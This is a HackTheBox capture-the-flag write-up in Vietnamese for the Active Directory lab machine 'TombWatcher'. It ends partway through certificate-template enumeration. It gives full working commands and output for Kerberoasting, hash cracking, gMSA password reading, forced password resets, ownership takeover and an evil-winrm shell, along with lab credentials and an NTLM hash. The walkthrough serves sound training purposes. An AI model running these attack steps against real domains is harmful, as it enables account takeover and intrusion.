---
layout: single
title: "TombWatcher"
date: 2025-10-23 16:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, ActiveDirectory , Machine]
---
# Recon 
## nmap
```bash
❯ sudo nmap -sS -sV -sC -p- 10.10.11.72      
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-20 15:42 +0700
Nmap scan report for 10.10.11.72
Host is up (0.27s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-20 13:00:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: OpenSSL required to parse certificate.
|_-----END CERTIFICATE-----
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-10-20T13:02:12+00:00; +3h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl
| ssl-cert: OpenSSL required to parse certificate.
|_-----END CERTIFICATE-----
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-10-20T13:02:10+00:00; +4h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-10-20T13:02:12+00:00; +3h59m59s from scanner time.
| ssl-cert: OpenSSL required to parse certificate.
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
3269/tcp  open  ssl
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
| ssl-cert: OpenSSL required to parse certificate.
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-20T13:02:10+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49751/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49751/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49751/tcp open  msrpc         Microsoft Windows RPC
49751/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-20T13:01:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1168.54 seconds  
```

Decode openSSL cert ta được `CN=DC01.tombwatcher.htb`.

=> Tổng quan có:
```
Domain: tombwatcher.htb
DCHost: DC01.tombwatcher.htb
Cert Issuer: tombwatcher-CA-1
```

Đã có credentials `henry:H3nry_987TGV!`.

Dùng `crackmapexec` để test nhanh.
```bash
❯ crackmapexec smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb

SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
```
Liệt kê shares bằng `smbclient`:
```bash
❯ smbclient -L //10.10.11.72 -U 'tombwatcher.htb/henry'

Password for [TOMBWATCHER.HTB\henry]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- `ADMIN$` và `C$` là hidden administrative shares (tên kết thúc bằng `$` ⇒ ẩn). Chúng tồn tại mặc định trên Windows và chỉ cho admin truy cập.

- `NETLOGON` và `SYSVOL` thường xuất hiện trên `Domain Controller`. `NETLOGON` chứa logon scripts; `SYSVOL` chứa `GPOs` (Group Policy) — cả hai có thể tiết lộ cấu hình, script hoặc thông tin đăng nhập tạm thời nếu admin sơ hở.

- `IPC$` không phải nơi lưu file, mà là endpoint để chạy các lệnh RPC hoặc thực hiện authentication over SMB.

Port 80 mở:
```bash
❯ whatweb http://tombwatcher.htb

http://tombwatcher.htb [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.72], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```
Đây là default landing page của IIS.

Sử dụng `rpcclient` để kết nối tới máy chủ.
```bash
❯ rpcclient -U 'henry%H3nry_987TGV!' 10.10.11.72
# Lấy thông tin máy chủ
rpcclient $> srvinfo
        10.10.11.72    Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b

# Lấy thông tin domain
rpcclient $> querydominfo
Domain:         TOMBWATCHER
Server:
Comment:
Total Users:    43
Total Groups:   0
Total Aliases:  16
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

# Liệt kê tất cả người dùng domain
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Henry] rid:[0x44f]
user:[Alfred] rid:[0x450]
user:[sam] rid:[0x451]
user:[john] rid:[0x452]
user:[$DUPLICATE-455] rid:[0x455]

# Liệt kê tất cả nhóm domain:
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Infrastructure] rid:[0x453]
```
Liệt kê đặc quyền và chính sách:
```bash
# Liệt kê quyền hệ thống
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)        
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)        
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)       
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)

# Lấy thông tin chính sách mật khẩu domain:
rpcclient $> getdompwinfo
min_password_length: 1
password_properties: 0x00000000
```
Do đã có credentials,nên ta nghĩ đến 2 vector `Kerberoasting` và `Unconstrained Delegation`.

Liệt kê tài khoản (user/computer) trong domain có `servicePrincipalName` (SPN) được gán.
```bash
❯ ldapsearch -x -H ldap://10.10.11.72 -D 'henry@tombwatcher.htb' -w 'H3nry_987TGV!' -b 'DC=tombwatcher,DC=htb' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
# extended LDIF
#
# LDAPv3
# base <DC=tombwatcher,DC=htb> with scope subtree
# filter: (servicePrincipalName=*)
# requesting: sAMAccountName servicePrincipalName
#

# DC01, Domain Controllers, tombwatcher.htb
dn: CN=DC01,OU=Domain Controllers,DC=tombwatcher,DC=htb
sAMAccountName: DC01$
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.tombwatcher.htb
servicePrincipalName: ldap/DC01.tombwatcher.htb/ForestDnsZones.tombwatcher.htb
servicePrincipalName: ldap/DC01.tombwatcher.htb/DomainDnsZones.tombwatcher.htb
servicePrincipalName: DNS/DC01.tombwatcher.htb  
servicePrincipalName: GC/DC01.tombwatcher.htb/tombwatcher.htb
servicePrincipalName: RestrictedKrbHost/DC01.tombwatcher.htb
servicePrincipalName: RestrictedKrbHost/DC01    
servicePrincipalName: RPC/da096012-36b8-4007-9cf2-dc466c8236f0._msdcs.tombwatcher.htb
servicePrincipalName: HOST/DC01/TOMBWATCHER     
servicePrincipalName: HOST/DC01.tombwatcher.htb/TOMBWATCHER
servicePrincipalName: HOST/DC01
servicePrincipalName: HOST/DC01.tombwatcher.htb 
servicePrincipalName: HOST/DC01.tombwatcher.htb/tombwatcher.htb
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/da096012-36b8-4007-9cf2-dc466c8236f0/tombwatcher.htb
servicePrincipalName: ldap/DC01/TOMBWATCHER     
servicePrincipalName: ldap/da096012-36b8-4007-9cf2-dc466c8236f0._msdcs.tombwatcher.htb
servicePrincipalName: ldap/DC01.tombwatcher.htb/TOMBWATCHER
servicePrincipalName: ldap/DC01
servicePrincipalName: ldap/DC01.tombwatcher.htb 
servicePrincipalName: ldap/DC01.tombwatcher.htb/tombwatcher.htb

# Alfred, Users, tombwatcher.htb
dn: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb    
sAMAccountName: Alfred
servicePrincipalName: http/anything

# john, Users, tombwatcher.htb
dn: CN=john,CN=Users,DC=tombwatcher,DC=htb      
sAMAccountName: john
servicePrincipalName: http/pwned

# krbtgt, Users, tombwatcher.htb
dn: CN=krbtgt,CN=Users,DC=tombwatcher,DC=htb    
sAMAccountName: krbtgt
servicePrincipalName: kadmin/changepw

# search reference
ref: ldap://ForestDnsZones.tombwatcher.htb/DC=ForestDnsZones,DC=tombwatcher,DC=htb

# search reference
ref: ldap://DomainDnsZones.tombwatcher.htb/DC=DomainDnsZones,DC=tombwatcher,DC=htb

# search reference
ref: ldap://tombwatcher.htb/CN=Configuration,DC=tombwatcher,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 8
# numEntries: 4
# numReferences: 3
```
Tìm được 3 account có SPN: `john`, `krbtgt` , `Alfred`

Do `krbtgt` là account đặc biệt của KDC (`Kerberos ticket-granting account`) nên ta sẽ không dùng Kerberoast trên krbtgt.

Mục tiêu : Khai thác Kerberoast 2 account `john` và `Alfred`

Lấy tất cả SPN và request TGS
```bash
❯ impacket-GetUserSPNs -request -dc-ip 10.10.11.72 tombwatcher.htb/henry:'H3nry_987TGV!' -save -outputfile SPN_SilverTicket.out
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name    MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------  ------  --------  --------------------------  ---------  ----------
http/pwned            Alfred            2025-05-12 22:17:03.526670  <never>       

[-] CCache file is not found. Skipping...
```
Bắt đầu crack với `john`:
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs SPN_SilverTicket.out 

# theo dõi tiến trình
john --status
# xem mật khẩu khi đã tìm được
❯ john --show SPN_SilverTicket.out
?:basketball

1 password hash cracked, 0 left
```
Đã crack được pass của `Alfred` là `basketball`

Hoặc có thể dùng `BloodHound`:
```bash
❯ bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns 10.10.11.72 --zip -c All -dc 'dc01.tombwatcher.htb'

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
WARNING: Connection timed out while resolving sids
INFO: Done in 00M 49S
INFO: Compressing output into 20251020222119_bloodhound.zip
```
Import `20251020222119_bloodhound.zip` vào BloodHound, phân tích ta có chain :
```
[Alfred]---AddSelf--->[INFRASTRUCTURE]---ReadGMSAPassword--->[ANSIBLE_DEV]--->ForceChangePassword--->[SAM]--->WriteOwner--->[John]---GenericAll---->[ADCS]
```


## User
Đầu tiên nghĩ đến việc sử dụng PowerView để leo quyền, nhưng ko thể rev/tạo powershell:
```bash
❯ impacket-wmiexec tombwatcher.htb/alfred:'basketball'@10.10.11.72 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED

❯ impacket-smbexec tombwatcher.htb/alfred:'basketball'@10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 

❯ impacket-psexec tombwatcher.htb/alfred:'basketball'@10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.72.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```
### Tại sao ???
#### **WinRM**
Đầu tiên kiểm tra xem có WinRM (Windows Remote Management) services không:
```bash
❯ sudo nmap -sS -sV -sC -p 5985,5986 10.10.11.72 


PORT     STATE    SERVICE VERSION
5985/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp filtered wsmans
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds
```
Port `5985` là port mặc định cho WinRM chạy qua http.
Port `5986` là port mặc định cho WinRM chạy qua https.

Port 5985 mở, test thử:
```bash
❯ nc -vn 10.10.11.72 5985   
(UNKNOWN) [10.10.11.72] 5985 (?) open
```
Tuy có mở port 5985, nhưng vì user Alfred không nằm trong nhóm quyền `Remote Management Users` nên không thể tạo phiên Powershell từ xa được.

#### **WMI**
Windows Management Instrumentation (WMI) sử dụng RPC/DCOM (Cổng 135 và các cổng ngẫu nhiên khác) để gọi phương thức `Win32_Process::Create` để thực thi lệnh từ xa.

`impacket-wmiexec` không thực sự tạo ra một shell tương tác (như SSH hay WinRM), mà nó hoạt động theo cơ chế thực thi lệnh và quản lý output để mô phỏng một shell:
1. Kết nối và Xác thực: Sử dụng giao thức `SMB` (`Server Message Block`, thường là cổng 445) để xác thực với máy mục tiêu bằng thông tin đăng nhập của người dùng.
2. Thực thi Lệnh qua `WMI` :
  - Sau khi xác thực, nó sử dụng `WMI` (thông qua giao thức DCOM/RPC trên các cổng ngẫu nhiên, hoặc cố định 135) để gọi một phương thức (method) trong WMI.

  - Cụ thể, nó thường gọi lớp Win32_Process và phương thức Create để yêu cầu hệ thống Windows chạy một lệnh mới.

3. Mô phỏng Shell:
- Lệnh được thực thi thường là `cmd.exe` hoặc `powershell.exe` với lệnh mà bạn nhập.
- `impacket-wmiexec` sử dụng một số thủ thuật để chuyển hướng đầu vào/đầu ra (`stdin/stdout`) của lệnh chạy trên máy chủ về lại máy client, giúp có cảm giác như đang dùng một shell tương tác.

Tóm lại, nó dùng WMI để tạo một quy trình mới cho mỗi lệnh nhập vào và dùng SMB để truyền tải thông tin đăng nhập và quản lý file output (nếu cần).

Để sử dụng được `impacket-wmiexec` thì tài khoản cần có quyền quản trị. (Hoặc 1 số trường hợp cần quyền `Remote WMI` + `Execute Methods`)

Ở đây tài khoản Alfred không có quyền quản trị nên không thể dùng `impacket-wmiexec`.

#### **smbexec**
`impacket-smbexec` dựa trên sự kết hợp của hai dịch vụ chính:
- SMB (Server Message Block) sử dụng port TCP 445: Giao thức cốt lõi để xác thực, tải file lệnh, và thu thập kết quả.
- SCM (Service Control Manager) sử dụng RPC/DCOM (Qua port 135) : Dịch vụ thực thi được sử dụng để tạo và chạy một dịch vụ mới, buộc dịch vụ này chạy file `.bat` chứa lệnh của người dùng.

`impacket-smbexec` hoạt động bằng cách sử dụng giao thức SMB để tạo và quản lý một dịch vụ Windows tạm thời trên máy chủ mục tiêu. Quá trình này mô phỏng một shell như sau:
1. Xác thực và Kết nối SMB: Công cụ sử dụng giao thức SMB (cổng 445) để kết nối và xác thực với máy mục tiêu.
2. Tải file Batch (`.bat`) Tạm thời: 
- `smbexec` ghi lệnh muốn chạy vào một file `.bat` tạm thời.
- Sau đó, nó sử dụng SMB để tải file `.bat` này lên một thư mục chia sẻ có thể ghi được trên máy chủ (thường là thư mục `C:\Windows\TEMP` hoặc thư mục chia sẻ Admin như `C$`).
3. Tạo và Chạy Dịch vụ: 
- Công cụ sử dụng giao thức MSRPC (qua SMB hoặc RPC/DCOM, cổng 135) để tương tác với dịch vụ Service Control Manager (SCM) của Windows.
- Nó ra lệnh cho SCM tạo một dịch vụ mới tạm thời, với lệnh thực thi của dịch vụ này là chạy file `.bat` vừa được tải lên.
4. Thu thập Output và Dọn dẹp:
- Khi file `.bat` chạy, nó sẽ ghi kết quả (output) của lệnh vào một file text khác.
- `smbexec` sử dụng SMB để đọc file output này về máy client.
- Cuối cùng, nó ra lệnh cho SCM xóa dịch vụ tạm thời và sử dụng SMB để xóa các file `.bat` và file output, dọn dẹp dấu vết.

Vì `smbexec` dựa vào việc tạo và quản lý một dịch vụ hệ thống mới, nó có một yêu cầu về quyền hạn rất cao, nên tài khoản Alfred không đủ quyền.

#### **psexec**
Tương tự như `smbexec`, nhưng thay vì tải lên file `.bat` thì `psexec` tạo một dịch vụ thực sự và chạy một binary.

Do không thể chạy powershell hay cmd để kéo và sử dụng PowerView,chuyển hướng sử dụng BloodyAD để leo AD.
> `bloodyAD` là một công cụ khai thác và leo thang đặc quyền trong Active Directory (AD) bằng cách thực hiện các cuộc gọi LDAP (Lightweight Directory Access Protocol) chuyên biệt.
### AddSelf
Sử dụng quyền `AddSelf` để tự add user `Alfred` vào group `INFRASTRUCTURE` :
```bash
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred

[+] alfred added to INFRASTRUCTURE
```
### ReadGMSAPassword
Khi `alfred` giờ là member của group `INFRASTRUCTURE`,ta có khả năng truy vấn `msDS-ManagedPassword` của `ANSIBLE_DEV` nhờ quyền `ReadGMSAPassword` :
```bash
❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'alfred' -p 'basketball' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword

distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
msDS-ManagedPassword.NT: bf8b11e301f7ba3fdc616e5d4fa01c30
msDS-ManagedPassword.B64ENCODED: hTHfon3m4u5bkUTSlOKiTcVGqaIiYqe4SrrDZd8uUEmyGMin8X1qKy6L5ZHVlsvRp17h6l5hC0OqLxYV/WGcmmGom+hqBklNY+MSgPO2r8SUnGniBbV3VR2C6pak3TJxRHd+4yb8iNDsLLgEG/goJ8yVoaaYpQppZWEOtE9EvQLV0nYjWoReut1xHZ1QP/kmHL6hOGrASDo2FIgXRQmEzjyatED/Zdz7s3mfB3OuOWxQUiyd4tic2RFKHEjurhJXN8iuVh0jPJzyWqEiF+5+ZYDckA52ICoIN9JhyAxH3R6Ftqjok3Xc524zjHBiE3Fb7ZMBtNkjobLCxW3976E1yw==
```
Hoặc
```bash
❯ nxc ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: bf8b11e301f7ba3fdc616e5d4fa01c30     PrincipalsAllowedToReadPassword: Infrastructure
```
#### Bonus: 

`gMSA` = Group Managed Service Account trong Active Directory (AD).

- Là service account đặc biệt do AD quản lý.
- Khác với user account thông thường: gMSA không có password cố định do con người quản lý.
- AD tự động tạo và xoay vòng mật khẩu cho gMSA theo chu kỳ (thường 30 ngày, tùy policy).
- Dùng cho service, task, hoặc ứng dụng chạy trên nhiều máy mà vẫn muốn password được quản lý tập trung.

Cách gMSA hoạt động:
1. AD tạo object gMSA trong OU, ví dụ `CN=ANSIBLE_DEV,OU=Managed Service Accounts,DC=tombwatcher,DC=htb`.

2. AD lưu password trong attribute `msDS-ManagedPassword` (encrypted).

3. Service trên máy được phép đọc password thông qua extended right `ReadGMSAPassword`.

4. Khi service cần authenticate (Windows logon, Kerberos), AD trả password gMSA mà service dùng, người dùng không bao giờ biết.

5. AD tự rotate password → service vẫn chạy bình thường mà không cần admin đổi thủ công.

Đã có NTLM hash của `ANSIBLE_DEV$` là `bf8b11e301f7ba3fdc616e5d4fa01c30`, test kết nối qua SMB bằng NTLM Hash:
```bash
❯ nxc smb 10.10.11.72 -u 'ANSIBLE_DEV$' -H bf8b11e301f7ba3fdc616e5d4fa01c30
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:bf8b11e301f7ba3fdc616e5d4fa01c30
```
### ForceChangePassword
Sau khi có NTLM hash của `ANSIBLE_DEV$` , có thể ForceChangePassword của `SAM`
```bash
❯ bloodyAD --dc-ip 10.10.11.72 -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':bf8b11e301f7ba3fdc616e5d4fa01c30' set password 'SAM' 'Password@123'

[+] Password changed successfully!
```
Test kết nối qua SMB:
```bash
❯ nxc smb 10.10.11.72 -u 'SAM' -p 'Password@123'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\SAM:Password@123
```
### WriteOwner
Sử dụng tài khoản SAM để thay đổi Chủ sở hữu (Owner) của đối tượng John thành tài khoản SAM.
```bash
❯ bloodyAD --dc-ip 10.10.11.72 -d tombwatcher.htb  -u SAM -p 'Password@123' set owner 'John' SAM
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by SAM on John
```
Đổi pass tài khoản John:
```bash
❯ bloodyAD --dc-ip 10.10.11.72 -d tombwatcher.htb  -u SAM -p 'Password@123' add genericAll 'John' SAM
[+] SAM has now GenericAll on John

❯ bloodyAD --dc-ip 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password@123' set password 'John' 'Password@1234'
[+] Password changed successfully!
```
Test kết nối SMB:
```bash
❯ nxc smb 10.10.11.72 -u 'john' -p 'Password@1234'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\john:Password@1234
```


Do John là member của group `Remote Managerment Users`,test thử với `nxc winrm`
```bash
❯ nxc winrm 10.10.11.72 -u 'john' -p 'Password@1234'
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.10.11.72     5985   DC01             [+] tombwatcher.htb\john:Password@1234 (Pwn3d!)
```
Spaw powershell với `evil-winrm` :
```bash
❯ evil-winrm -i 10.10.11.72 -u john -p Password@1234 -c 'whoami'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: Useless cert/s provided, SSL is not enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State        
============================= ============================== =======      
SeMachineAccountPrivilege     Add workstations to domain     Enabled      
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled      
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
```
Lấy flag đầu tiên: 
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> type ..\desktop\user.txt
5a8b6d6c53e4940f5bda7dc7099bb0b7
```
> Flag 1: `5a8b6d6c53e4940f5bda7dc7099bb0b7`
## Root
### CA Enum
```bash
❯ certipy find -u 'john' -p 'Password@1234' -dc-ip 10.10.11.72
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20251021201312_Certipy.txt'
[*] Wrote text output to '20251021201312_Certipy.txt'
[*] Saving JSON output to '20251021201312_Certipy.json'
[*] Wrote JSON output to '20251021201312_Certipy.json'
```
Ở đây ta thấy certipy không lấy được thông tin của object có SID `S-1-5-21-1392491010-1358638721-2126982587-1111` , có khả năng nó đã bị xóa.

Có 3 Template bị nghi ngờ : `User` , `Machine` và `WebServer`

Kiểm tra Template `User` :
```
32
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
